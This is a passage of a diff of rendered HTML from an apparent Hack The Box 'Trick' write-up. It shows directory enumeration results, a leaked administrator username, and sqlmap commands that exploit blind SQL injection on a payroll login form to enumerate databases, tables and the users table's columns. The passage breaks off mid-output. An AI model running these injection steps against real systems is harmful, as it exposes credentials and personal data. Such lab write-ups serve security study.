-</span><span id="__span-16-30"><a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a>/assets/font-awesome/css/
-</span><span id="__span-16-31"><a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a>/assets/vendor/bootstrap-datepicker/locales/
-</span><span id="__span-16-32"><a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a>/assets/font-awesome/less/
-</span><span id="__span-16-33"><a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a>
-</span><span id="__span-16-34"><a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a>
-</span><span id="__span-16-35"><a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a>--------------------------------
-</span><span id="__span-16-36"><a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a>Files found during testing:
-</span><span id="__span-16-37"><a id="__codelineno-16-37" name="__codelineno-16-37" href="#__codelineno-16-37"></a>
-</span><span id="__span-16-38"><a id="__codelineno-16-38" name="__codelineno-16-38" href="#__codelineno-16-38"></a>Files found with a 302 responce:
-</span><span id="__span-16-39"><a id="__codelineno-16-39" name="__codelineno-16-39" href="#__codelineno-16-39"></a>
-</span><span id="__span-16-40"><a id="__codelineno-16-40" name="__codelineno-16-40" href="#__codelineno-16-40"></a>/index.php
-</span><span id="__span-16-41"><a id="__codelineno-16-41" name="__codelineno-16-41" href="#__codelineno-16-41"></a>
-</span><span id="__span-16-42"><a id="__codelineno-16-42" name="__codelineno-16-42" href="#__codelineno-16-42"></a>Files found with a 200 responce:
-</span><span id="__span-16-43"><a id="__codelineno-16-43" name="__codelineno-16-43" href="#__codelineno-16-43"></a>
-</span><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44" href="#__codelineno-16-44"></a>/login.php
-</span><span id="__span-16-45"><a id="__codelineno-16-45" name="__codelineno-16-45" href="#__codelineno-16-45"></a>/home.php
-</span><span id="__span-16-46"><a id="__codelineno-16-46" name="__codelineno-16-46" href="#__codelineno-16-46"></a>/header.php
-</span><span id="__span-16-47"><a id="__codelineno-16-47" name="__codelineno-16-47" href="#__codelineno-16-47"></a>/users.php
-</span><span id="__span-16-48"><a id="__codelineno-16-48" name="__codelineno-16-48" href="#__codelineno-16-48"></a>/ajax.php
-</span><span id="__span-16-49"><a id="__codelineno-16-49" name="__codelineno-16-49" href="#__codelineno-16-49"></a>/navbar.php
-</span><span id="__span-16-50"><a id="__codelineno-16-50" name="__codelineno-16-50" href="#__codelineno-16-50"></a>/assets/vendor/jquery/jquery.min.js
-</span><span id="__span-16-51"><a id="__codelineno-16-51" name="__codelineno-16-51" href="#__codelineno-16-51"></a>/assets/DataTables/datatables.min.js
-</span><span id="__span-16-52"><a id="__codelineno-16-52" name="__codelineno-16-52" href="#__codelineno-16-52"></a>/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
-</span><span id="__span-16-53"><a id="__codelineno-16-53" name="__codelineno-16-53" href="#__codelineno-16-53"></a>/assets/vendor/jquery.easing/jquery.easing.min.js
-</span><span id="__span-16-54"><a id="__codelineno-16-54" name="__codelineno-16-54" href="#__codelineno-16-54"></a>/assets/vendor/php-email-form/validate.js
-</span><span id="__span-16-55"><a id="__codelineno-16-55" name="__codelineno-16-55" href="#__codelineno-16-55"></a>/assets/vendor/venobox/venobox.min.js
-</span><span id="__span-16-56"><a id="__codelineno-16-56" name="__codelineno-16-56" href="#__codelineno-16-56"></a>/assets/vendor/waypoints/jquery.waypoints.min.js
-</span><span id="__span-16-57"><a id="__codelineno-16-57" name="__codelineno-16-57" href="#__codelineno-16-57"></a>/assets/vendor/counterup/counterup.min.js
-</span><span id="__span-16-58"><a id="__codelineno-16-58" name="__codelineno-16-58" href="#__codelineno-16-58"></a>/assets/vendor/owl.carousel/owl.carousel.min.js
-</span><span id="__span-16-59"><a id="__codelineno-16-59" name="__codelineno-16-59" href="#__codelineno-16-59"></a>/assets/js/select2.min.js
-</span><span id="__span-16-60"><a id="__codelineno-16-60" name="__codelineno-16-60" href="#__codelineno-16-60"></a>/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js
-</span><span id="__span-16-61"><a id="__codelineno-16-61" name="__codelineno-16-61" href="#__codelineno-16-61"></a>/assets/js/jquery.datetimepicker.full.min.js
-</span><span id="__span-16-62"><a id="__codelineno-16-62" name="__codelineno-16-62" href="#__codelineno-16-62"></a>/assets/js/jquery-te-1.4.0.min.js
-</span><span id="__span-16-63"><a id="__codelineno-16-63" name="__codelineno-16-63" href="#__codelineno-16-63"></a>/assets/font-awesome/js/all.min.js
-</span><span id="__span-16-64"><a id="__codelineno-16-64" name="__codelineno-16-64" href="#__codelineno-16-64"></a>/department.php
-</span><span id="__span-16-65"><a id="__codelineno-16-65" name="__codelineno-16-65" href="#__codelineno-16-65"></a>/topbar.php
-</span><span id="__span-16-66"><a id="__codelineno-16-66" name="__codelineno-16-66" href="#__codelineno-16-66"></a>/position.php
-</span><span id="__span-16-67"><a id="__codelineno-16-67" name="__codelineno-16-67" href="#__codelineno-16-67"></a>/employee.php
-</span><span id="__span-16-68"><a id="__codelineno-16-68" name="__codelineno-16-68" href="#__codelineno-16-68"></a>/payroll.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span>
+<span class="normal"><a href="#__codelineno-16-11">11</a></span>
+<span class="normal"><a href="#__codelineno-16-12">12</a></span>
+<span class="normal"><a href="#__codelineno-16-13">13</a></span>
+<span class="normal"><a href="#__codelineno-16-14">14</a></span>
+<span class="normal"><a href="#__codelineno-16-15">15</a></span>
+<span class="normal"><a href="#__codelineno-16-16">16</a></span>
+<span class="normal"><a href="#__codelineno-16-17">17</a></span>
+<span class="normal"><a href="#__codelineno-16-18">18</a></span>
+<span class="normal"><a href="#__codelineno-16-19">19</a></span>
+<span class="normal"><a href="#__codelineno-16-20">20</a></span>
+<span class="normal"><a href="#__codelineno-16-21">21</a></span>
+<span class="normal"><a href="#__codelineno-16-22">22</a></span>
+<span class="normal"><a href="#__codelineno-16-23">23</a></span>
+<span class="normal"><a href="#__codelineno-16-24">24</a></span>
+<span class="normal"><a href="#__codelineno-16-25">25</a></span>
+<span class="normal"><a href="#__codelineno-16-26">26</a></span>
+<span class="normal"><a href="#__codelineno-16-27">27</a></span>
+<span class="normal"><a href="#__codelineno-16-28">28</a></span>
+<span class="normal"><a href="#__codelineno-16-29">29</a></span>
+<span class="normal"><a href="#__codelineno-16-30">30</a></span>
+<span class="normal"><a href="#__codelineno-16-31">31</a></span>
+<span class="normal"><a href="#__codelineno-16-32">32</a></span>
+<span class="normal"><a href="#__codelineno-16-33">33</a></span>
+<span class="normal"><a href="#__codelineno-16-34">34</a></span>
+<span class="normal"><a href="#__codelineno-16-35">35</a></span>
+<span class="normal"><a href="#__codelineno-16-36">36</a></span>
+<span class="normal"><a href="#__codelineno-16-37">37</a></span>
+<span class="normal"><a href="#__codelineno-16-38">38</a></span>
+<span class="normal"><a href="#__codelineno-16-39">39</a></span>
+<span class="normal"><a href="#__codelineno-16-40">40</a></span>
+<span class="normal"><a href="#__codelineno-16-41">41</a></span>
+<span class="normal"><a href="#__codelineno-16-42">42</a></span>
+<span class="normal"><a href="#__codelineno-16-43">43</a></span>
+<span class="normal"><a href="#__codelineno-16-44">44</a></span>
+<span class="normal"><a href="#__codelineno-16-45">45</a></span>
+<span class="normal"><a href="#__codelineno-16-46">46</a></span>
+<span class="normal"><a href="#__codelineno-16-47">47</a></span>
+<span class="normal"><a href="#__codelineno-16-48">48</a></span>
+<span class="normal"><a href="#__codelineno-16-49">49</a></span>
+<span class="normal"><a href="#__codelineno-16-50">50</a></span>
+<span class="normal"><a href="#__codelineno-16-51">51</a></span>
+<span class="normal"><a href="#__codelineno-16-52">52</a></span>
+<span class="normal"><a href="#__codelineno-16-53">53</a></span>
+<span class="normal"><a href="#__codelineno-16-54">54</a></span>
+<span class="normal"><a href="#__codelineno-16-55">55</a></span>
+<span class="normal"><a href="#__codelineno-16-56">56</a></span>
+<span class="normal"><a href="#__codelineno-16-57">57</a></span>
+<span class="normal"><a href="#__codelineno-16-58">58</a></span>
+<span class="normal"><a href="#__codelineno-16-59">59</a></span>
+<span class="normal"><a href="#__codelineno-16-60">60</a></span>
+<span class="normal"><a href="#__codelineno-16-61">61</a></span>
+<span class="normal"><a href="#__codelineno-16-62">62</a></span>
+<span class="normal"><a href="#__codelineno-16-63">63</a></span>
+<span class="normal"><a href="#__codelineno-16-64">64</a></span>
+<span class="normal"><a href="#__codelineno-16-65">65</a></span>
+<span class="normal"><a href="#__codelineno-16-66">66</a></span>
+<span class="normal"><a href="#__codelineno-16-67">67</a></span>
+<span class="normal"><a href="#__codelineno-16-68">68</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>Dirs found with a 302 response:
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>/
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>Dirs found with a 403 response:
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a>/assets/
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>/database/
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>/assets/vendor/
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a>/assets/img/
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11"></a>/assets/vendor/jquery/
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12"></a>/assets/DataTables/
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a>/assets/vendor/bootstrap/
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14"></a>/assets/vendor/bootstrap/js/
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15"></a>/assets/vendor/jquery.easing/
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16"></a>/assets/css/
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17"></a>/assets/vendor/php-email-form/
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18"></a>/assets/vendor/venobox/
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19"></a>/assets/vendor/waypoints/
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20"></a>/assets/vendor/counterup/
+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21"></a>/assets/vendor/owl.carousel/
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22"></a>/assets/vendor/bootstrap-datepicker/
+</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23"></a>/assets/vendor/bootstrap-datepicker/js/
+</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24"></a>/assets/js/
+</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25"></a>/assets/font-awesome/
+</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26"></a>/assets/font-awesome/js/
+</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27"></a>/assets/vendor/owl.carousel/assets/
+</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28"></a>/assets/vendor/bootstrap/css/
+</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29"></a>/assets/vendor/bootstrap-datepicker/css/
+</span><span id="__span-16-30"><a id="__codelineno-16-30" name="__codelineno-16-30"></a>/assets/font-awesome/css/
+</span><span id="__span-16-31"><a id="__codelineno-16-31" name="__codelineno-16-31"></a>/assets/vendor/bootstrap-datepicker/locales/
+</span><span id="__span-16-32"><a id="__codelineno-16-32" name="__codelineno-16-32"></a>/assets/font-awesome/less/
+</span><span id="__span-16-33"><a id="__codelineno-16-33" name="__codelineno-16-33"></a>
+</span><span id="__span-16-34"><a id="__codelineno-16-34" name="__codelineno-16-34"></a>
+</span><span id="__span-16-35"><a id="__codelineno-16-35" name="__codelineno-16-35"></a>--------------------------------
+</span><span id="__span-16-36"><a id="__codelineno-16-36" name="__codelineno-16-36"></a>Files found during testing:
+</span><span id="__span-16-37"><a id="__codelineno-16-37" name="__codelineno-16-37"></a>
+</span><span id="__span-16-38"><a id="__codelineno-16-38" name="__codelineno-16-38"></a>Files found with a 302 responce:
+</span><span id="__span-16-39"><a id="__codelineno-16-39" name="__codelineno-16-39"></a>
+</span><span id="__span-16-40"><a id="__codelineno-16-40" name="__codelineno-16-40"></a>/index.php
+</span><span id="__span-16-41"><a id="__codelineno-16-41" name="__codelineno-16-41"></a>
+</span><span id="__span-16-42"><a id="__codelineno-16-42" name="__codelineno-16-42"></a>Files found with a 200 responce:
+</span><span id="__span-16-43"><a id="__codelineno-16-43" name="__codelineno-16-43"></a>
+</span><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44"></a>/login.php
+</span><span id="__span-16-45"><a id="__codelineno-16-45" name="__codelineno-16-45"></a>/home.php
+</span><span id="__span-16-46"><a id="__codelineno-16-46" name="__codelineno-16-46"></a>/header.php
+</span><span id="__span-16-47"><a id="__codelineno-16-47" name="__codelineno-16-47"></a>/users.php
+</span><span id="__span-16-48"><a id="__codelineno-16-48" name="__codelineno-16-48"></a>/ajax.php
+</span><span id="__span-16-49"><a id="__codelineno-16-49" name="__codelineno-16-49"></a>/navbar.php
+</span><span id="__span-16-50"><a id="__codelineno-16-50" name="__codelineno-16-50"></a>/assets/vendor/jquery/jquery.min.js
+</span><span id="__span-16-51"><a id="__codelineno-16-51" name="__codelineno-16-51"></a>/assets/DataTables/datatables.min.js
+</span><span id="__span-16-52"><a id="__codelineno-16-52" name="__codelineno-16-52"></a>/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
+</span><span id="__span-16-53"><a id="__codelineno-16-53" name="__codelineno-16-53"></a>/assets/vendor/jquery.easing/jquery.easing.min.js
+</span><span id="__span-16-54"><a id="__codelineno-16-54" name="__codelineno-16-54"></a>/assets/vendor/php-email-form/validate.js
+</span><span id="__span-16-55"><a id="__codelineno-16-55" name="__codelineno-16-55"></a>/assets/vendor/venobox/venobox.min.js
+</span><span id="__span-16-56"><a id="__codelineno-16-56" name="__codelineno-16-56"></a>/assets/vendor/waypoints/jquery.waypoints.min.js
+</span><span id="__span-16-57"><a id="__codelineno-16-57" name="__codelineno-16-57"></a>/assets/vendor/counterup/counterup.min.js
+</span><span id="__span-16-58"><a id="__codelineno-16-58" name="__codelineno-16-58"></a>/assets/vendor/owl.carousel/owl.carousel.min.js
+</span><span id="__span-16-59"><a id="__codelineno-16-59" name="__codelineno-16-59"></a>/assets/js/select2.min.js
+</span><span id="__span-16-60"><a id="__codelineno-16-60" name="__codelineno-16-60"></a>/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js
+</span><span id="__span-16-61"><a id="__codelineno-16-61" name="__codelineno-16-61"></a>/assets/js/jquery.datetimepicker.full.min.js
+</span><span id="__span-16-62"><a id="__codelineno-16-62" name="__codelineno-16-62"></a>/assets/js/jquery-te-1.4.0.min.js
+</span><span id="__span-16-63"><a id="__codelineno-16-63" name="__codelineno-16-63"></a>/assets/font-awesome/js/all.min.js
+</span><span id="__span-16-64"><a id="__codelineno-16-64" name="__codelineno-16-64"></a>/department.php
+</span><span id="__span-16-65"><a id="__codelineno-16-65" name="__codelineno-16-65"></a>/topbar.php
+</span><span id="__span-16-66"><a id="__codelineno-16-66" name="__codelineno-16-66"></a>/position.php
+</span><span id="__span-16-67"><a id="__codelineno-16-67" name="__codelineno-16-67"></a>/employee.php
+</span><span id="__span-16-68"><a id="__codelineno-16-68" name="__codelineno-16-68"></a>/payroll.php
+</span></code></pre></div></td></tr></table></div>
 <p>In http://preprod-payroll.trick.htb/users.php there is this info:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>name: Administrator
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>username: Enemigosss
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>name: Administrator
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>username: Enemigosss
+</span></code></pre></div></td></tr></table></div>
 <h3 id="exploiting-a-sql-injection-vulnerability">Exploiting a sql injection vulnerability</h3>
 <p>If we have a look at the forms at http://preprod-payroll.trick.htb/login.php and run sqlmap, we'll see that it is vulnerable to SQL injection - Blind.</p>
 <p>We can extract databases:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>--dbs
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>--dbs
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>available databases [2]:
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>[*] information_schema
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>[*] payroll_db
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>available databases [2]:
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>[*] information_schema
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>[*] payroll_db
+</span></code></pre></div></td></tr></table></div>
 <p>Now, we extract tables from payroll_db database:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>--tables
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>--tables
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Database: payroll_db
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>[11 tables]
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>+---------------------+
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>| position            |
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>| allowances          |
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>| attendance          |
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>| deductions          |
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>| department          |
-</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>| employee            |
-</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>| employee_allowances |
-</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>| employee_deductions |
-</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>| payroll             |
-</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>| payroll_items       |
-</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>| users               |
-</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>+---------------------+
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-21-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-21-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-21-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-21-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-21-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-21-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-21-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-21-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-21-10">10</a></span>
+<span class="normal"><a href="#__codelineno-21-11">11</a></span>
+<span class="normal"><a href="#__codelineno-21-12">12</a></span>
+<span class="normal"><a href="#__codelineno-21-13">13</a></span>
+<span class="normal"><a href="#__codelineno-21-14">14</a></span>
+<span class="normal"><a href="#__codelineno-21-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>Database: payroll_db
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a>[11 tables]
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a>+---------------------+
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a>| position            |
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5"></a>| allowances          |
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6"></a>| attendance          |
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7"></a>| deductions          |
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8"></a>| department          |
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9"></a>| employee            |
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10"></a>| employee_allowances |
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11"></a>| employee_deductions |
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12"></a>| payroll             |
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13"></a>| payroll_items       |
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14"></a>| users               |
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15"></a>+---------------------+
+</span></code></pre></div></td></tr></table></div>
 <p>Next, we get columns from the users table:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Database: payroll_db
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>Table: users
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>[8 columns]
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>+-----------+--------------+
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>| Column    | Type         |
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>+-----------+--------------+
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>| address   | text         |
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>| contact   | text         |
-</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>| doctor_id | int(30)      |
-</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>| id        | int(30)      |
-</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>| name      | varchar(200) |
-</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>| password  | varchar(200) |
-</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>| type      | tinyint(1)   |
-</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>| username  | varchar(100) |
-</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>+-----------+--------------+
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-23-10">10</a></span>
+<span class="normal"><a href="#__codelineno-23-11">11</a></span>
+<span class="normal"><a href="#__codelineno-23-12">12</a></span>
+<span class="normal"><a href="#__codelineno-23-13">13</a></span>
+<span class="normal"><a href="#__codelineno-23-14">14</a></span>
+<span class="normal"><a href="#__codelineno-23-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>Database: payroll_db
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>Table: users
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>[8 columns]
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a>+-----------+--------------+
